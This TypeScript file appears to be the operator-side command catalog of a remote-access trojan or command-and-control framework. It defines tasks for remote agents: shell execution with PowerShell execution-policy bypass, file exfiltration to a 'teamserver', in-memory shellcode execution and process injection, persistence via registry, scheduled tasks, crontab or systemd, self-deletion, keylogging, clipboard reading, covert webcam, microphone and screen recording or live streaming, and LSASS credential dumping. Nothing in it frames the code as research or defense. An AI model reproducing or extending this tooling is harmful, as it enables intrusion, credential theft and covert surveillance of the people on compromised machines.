export type AgentPlatform = "linux" | "windows";

export type CommandField = {
  key: string;
  label: string;
  placeholder?: string;
  defaultValue?: string;
  multiline?: boolean;
  secret?: boolean;
};

export type CommandTemplate = {
  id: string;
  name: string;
  group: "Shell" | "Discovery" | "Files" | "Process" | "Network";
  summary: string;
  fields: CommandField[];
  build: (values: Record<string, string>, platform: AgentPlatform) => QueuedCommand;
};

export type QueuedCommand = {
  command: string;
  arguments: string[];
  preview: string;
};

function shQuote(value: string): string {
  return `'${value.replace(/'/g, `'\\''`)}'`;
}

function psQuote(value: string): string {
  return `'${value.replace(/'/g, "''")}'`;
}

function shell(script: string, platform: AgentPlatform): QueuedCommand {
  if (platform === "windows") {
    return {
      command: "powershell.exe",
      arguments: ["-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", script],
      preview: `powershell.exe -NoProfile -ExecutionPolicy Bypass -Command ${psQuote(script)}`
    };
  }

  return {
    command: "sh",
    arguments: ["-lc", script],
    preview: `sh -lc ${shQuote(script)}`
  };
}

function value(values: Record<string, string>, key: string, fallback = ""): string {
  return values[key]?.trim() || fallback;
}

export function platformFromAgentOs(osName: string): AgentPlatform {
  return osName.toLowerCase().includes("win") ? "windows" : "linux";
}

export const commandCatalog: CommandTemplate[] = [
  {
    id: "shell",
    name: "Shell Command",
    group: "Shell",
    summary: "Run a one-shot shell command on the selected agent.",
    fields: [
      { key: "line", label: "Command Line", defaultValue: "whoami", placeholder: "whoami", multiline: true }
    ],
    build: (values, platform) => shell(value(values, "line", "whoami"), platform)
  },
  {
    id: "system_info",
    name: "System Info",
    group: "Discovery",
    summary: "Collect host, user, OS, and architecture basics.",
    fields: [],
    build: (_, platform) =>
      shell(
        platform === "windows"
          ? "whoami; hostname; $PSVersionTable.OS; Get-CimInstance Win32_OperatingSystem | Select-Object Caption,Version,OSArchitecture | Format-List"
          : "whoami; hostname; uname -a; id",
        platform
      )
  },
  {
    id: "list_dir",
    name: "List Directory",
    group: "Files",
    summary: "Show file names, sizes, and timestamps for a path.",
    fields: [{ key: "path", label: "Path", defaultValue: ".", placeholder: "/tmp or C:\\Users" }],
    build: (values, platform) => {
      const path = value(values, "path", ".");
      return shell(
        platform === "windows"
          ? `Get-ChildItem -Force -LiteralPath ${psQuote(path)} | Format-Table Mode,Length,LastWriteTime,Name -AutoSize`
          : `ls -la -- ${shQuote(path)}`,
        platform
      );
    }
  },
  {
    id: "read_file",
    name: "Read File",
    group: "Files",
    summary: "Print a text file to the task output.",
    fields: [{ key: "path", label: "Remote Path", placeholder: "/etc/hosts or C:\\Temp\\note.txt" }],
    build: (values, platform) => {
      const path = value(values, "path");
      return shell(
        platform === "windows" ? `Get-Content -Raw -LiteralPath ${psQuote(path)}` : `cat -- ${shQuote(path)}`,
        platform
      );
    }
  },
  {
    id: "file_download",
    name: "Download File",
    group: "Files",
    summary: "Ask the agent to send a file back to teamserver storage.",
    fields: [{ key: "path", label: "Remote Path", placeholder: "/tmp/report.zip or C:\\Temp\\report.zip" }],
    build: (values) => {
      const path = value(values, "path");
      return {
        command: "file_download",
        arguments: [path],
        preview: `download ${path}`
      };
    }
  },
  {
    id: "process_list",
    name: "Process List",
    group: "Process",
    summary: "List running processes.",
    fields: [],
    build: (_, platform) =>
      shell(
        platform === "windows"
          ? "Get-Process | Sort-Object ProcessName | Select-Object ProcessName,Id,CPU,WorkingSet | Format-Table -AutoSize"
          : "ps aux",
        platform
      )
  },
  {
    id: "kill_process",
    name: "Kill Process",
    group: "Process",
    summary: "Terminate a process by PID.",
    fields: [{ key: "pid", label: "PID", placeholder: "1234" }],
    build: (values, platform) => {
      const pid = value(values, "pid");
      return shell(platform === "windows" ? `Stop-Process -Id ${pid} -Force` : `kill -9 ${shQuote(pid)}`, platform);
    }
  },
  {
    id: "network_info",
    name: "Network Info",
    group: "Network",
    summary: "Show interface and route information.",
    fields: [],
    build: (_, platform) =>
      shell(
        platform === "windows" ? "ipconfig /all; route print" : "ip addr; ip route",
        platform
      )
  },
  {
    id: "whoami",
    name: "Whoami",
    group: "Discovery",
    summary: "Return username, group memberships, integrity level, and elevation status as JSON.",
    fields: [],
    build: () => ({ command: "whoami", arguments: [], preview: "whoami" })
  },
  {
    id: "mem_exec",
    name: "Memory Execute",
    group: "Process",
    summary: "Allocate memory, copy shellcode in, and run it on a new thread.",
    fields: [
      { key: "sc", label: "Shellcode (base64)", placeholder: "TVqQAAMAAAAEAAAA", multiline: true, secret: true }
    ],
    build: (values) => ({
      command: "mem_exec",
      arguments: [value(values, "sc")],
      preview: `mem_exec ${value(values, "sc").slice(0, 24)}…`
    })
  },
  {
    id: "port_scan",
    name: "Port Scan",
    group: "Network",
    summary: "Quick TCP-connect scan of a host with a port list.",
    fields: [
      { key: "host", label: "Host", placeholder: "192.168.1.1" },
      { key: "ports", label: "Ports", placeholder: "22,80,8000-8100", defaultValue: "22,80,443" },
      { key: "timeout", label: "Timeout (ms)", defaultValue: "200" }
    ],
    build: (values) => ({
      command: "portscan",
      arguments: [value(values, "host"), value(values, "ports"), value(values, "timeout", "200")],
      preview: `portscan ${value(values, "host")} ${value(values, "ports")}`
    })
  },
  {
    id: "persist",
    name: "Install Persistence",
    group: "Process",
    summary: "Install a persistence mechanism on the target. Strategy: registry/schtasks (Windows) or crontab/systemd-user/shell-profile (Linux).",
    fields: [
      { key: "strategy", label: "Strategy", defaultValue: "registry", placeholder: "registry | schtasks | crontab | systemd-user | shell-profile" },
      { key: "bin", label: "Binary path (optional)", placeholder: "leave empty for self" }
    ],
    build: (values) => {
      const strategy = value(values, "strategy", "registry");
      const bin = value(values, "bin");
      const args = bin ? [strategy, bin] : [strategy];
      return { command: "persist", arguments: args, preview: `persist ${args.join(" ")}` };
    }
  },
  {
    id: "uninstall",
    name: "Uninstall",
    group: "Process",
    summary: "Self-delete the agent binary. now = spawn a one-shot to rm; reboot = schedule for next boot.",
    fields: [{ key: "mode", label: "Mode", defaultValue: "now", placeholder: "now | reboot" }],
    build: (values) => ({
      command: "uninstall",
      arguments: [value(values, "mode", "now")],
      preview: `uninstall ${value(values, "mode", "now")}`
    })
  },
  {
    id: "inject",
    name: "Process Inject",
    group: "Process",
    summary: "Inject shellcode into a remote process (Windows only).",
    fields: [
      { key: "pid", label: "Target PID", placeholder: "1234" },
      { key: "sc", label: "Shellcode (base64)", placeholder: "TVqQAAMAAAAEAAAA", multiline: true, secret: true },
      { key: "mode", label: "Mode (thread|hijack)", defaultValue: "thread" }
    ],
    build: (values) => ({
      command: "inject",
      arguments: [value(values, "pid"), value(values, "sc"), value(values, "mode", "thread")],
      preview: `inject ${value(values, "pid")} ${value(values, "sc").slice(0, 24)}…`
    })
  },
  {
    id: "screenshot",
    name: "Screenshot",
    group: "Discovery",
    summary: "Capture the primary display and return as base64 BMP.",
    fields: [],
    build: () => ({ command: "screenshot", arguments: [], preview: "screenshot" })
  },
  {
    id: "record_display",
    name: "Record Display",
    group: "Discovery",
    summary: "Record the primary display for N seconds at specified FPS. Returns MJPEG.",
    fields: [
      { key: "duration", label: "Duration (seconds)", defaultValue: "10", placeholder: "10" },
      { key: "fps", label: "Frames Per Second", defaultValue: "10", placeholder: "10" },
      { key: "quality", label: "JPEG Quality (1-100)", defaultValue: "70", placeholder: "70" }
    ],
    build: (values) => {
      const dur = value(values, "duration", "10");
      const fps = value(values, "fps", "10");
      const quality = value(values, "quality", "70");
      return {
        command: "record_display",
        arguments: [dur, fps, quality],
        preview: `record display ${dur}s ${fps}fps q${quality}`
      };
    }
  },
  {
    id: "record_camera",
    name: "Record Camera",
    group: "Discovery",
    summary: "Record from the default webcam for N seconds at specified FPS. Returns MJPEG.",
    fields: [
      { key: "duration", label: "Duration (seconds)", defaultValue: "10", placeholder: "10" },
      { key: "fps", label: "Frames Per Second", defaultValue: "10", placeholder: "10" },
      { key: "quality", label: "JPEG Quality (1-100)", defaultValue: "70", placeholder: "70" }
    ],
    build: (values) => {
      const dur = value(values, "duration", "10");
      const fps = value(values, "fps", "10");
      const quality = value(values, "quality", "70");
      return {
        command: "record_camera",
        arguments: [dur, fps, quality],
        preview: `record camera ${dur}s ${fps}fps q${quality}`
      };
    }
  },
  {
    id: "record_mic",
    name: "Record Microphone",
    group: "Discovery",
    summary: "Record from the default microphone for N seconds. Returns WAV audio.",
    fields: [
      { key: "duration", label: "Duration (seconds)", defaultValue: "10", placeholder: "10" }
    ],
    build: (values) => {
      const dur = value(values, "duration", "10");
      return {
        command: "record_mic",
        arguments: [dur],
        preview: `record mic ${dur}s`
      };
    }
  },
  {
    id: "stream_display",
    name: "Stream Display (Live)",
    group: "Discovery",
    summary: "Live-stream the primary display until stopped. Send a stream_stop task to end.",
    fields: [
      { key: "fps", label: "Frames Per Second", defaultValue: "10", placeholder: "10" },
      { key: "quality", label: "JPEG Quality (1-100)", defaultValue: "70", placeholder: "70" },
    ],
    build: (values) => {
      const fps = value(values, "fps", "10");
      const quality = value(values, "quality", "70");
      return {
        command: "stream_display",
        arguments: [fps, quality],
        preview: `stream display (live) ${fps}fps q${quality}`
      };
    }
  },
  {
    id: "stream_camera",
    name: "Stream Camera (Live)",
    group: "Discovery",
    summary: "Live-stream the default webcam until stopped. Send a stream_stop task to end.",
    fields: [
      { key: "fps", label: "Frames Per Second", defaultValue: "10", placeholder: "10" },
      { key: "quality", label: "JPEG Quality (1-100)", defaultValue: "70", placeholder: "70" },
    ],
    build: (values) => {
      const fps = value(values, "fps", "10");
      const quality = value(values, "quality", "70");
      return {
        command: "stream_camera",
        arguments: [fps, quality],
        preview: `stream camera (live) ${fps}fps q${quality}`
      };
    }
  },
  {
    id: "stream_mic",
    name: "Stream Microphone (Live)",
    group: "Discovery",
    summary: "Live-stream the default microphone until stopped. Send a stream_stop task to end.",
    fields: [],
    build: () => {
      return {
        command: "stream_mic",
        arguments: [],
        preview: `stream mic (live)`
      };
    }
  },
  {
    id: "stream_stop",
    name: "Stop Live Stream",
    group: "Discovery",
    summary: "Stop an active live stream (display, camera, or mic).",
    fields: [],
    build: () => ({
      command: "stream_stop",
      arguments: [],
      preview: "stream stop"
    })
  },
  {
    id: "clipboard",
    name: "Clipboard",
    group: "Discovery",
    summary: "Read the current clipboard text.",
    fields: [],
    build: () => ({ command: "clipboard", arguments: [], preview: "clipboard" })
  },
  {
    id: "keylog",
    name: "Keylog",
    group: "Discovery",
    summary: "Start a low-level keyboard hook or flush captured keystrokes.",
    fields: [
      { key: "mode", label: "Mode", defaultValue: "flush", placeholder: "start | flush" }
    ],
    build: (values) => ({
      command: "keylog",
      arguments: [value(values, "mode", "flush")],
      preview: `keylog ${value(values, "mode", "flush")}`
    })
  },
  {
    id: "lsass",
    name: "LSASS Dump",
    group: "Discovery",
    summary: "MiniDumpWriteDump lsass.exe and return the bytes (Windows only).",
    fields: [],
    build: () => ({ command: "lsass", arguments: [], preview: "lsass" })
  }
];
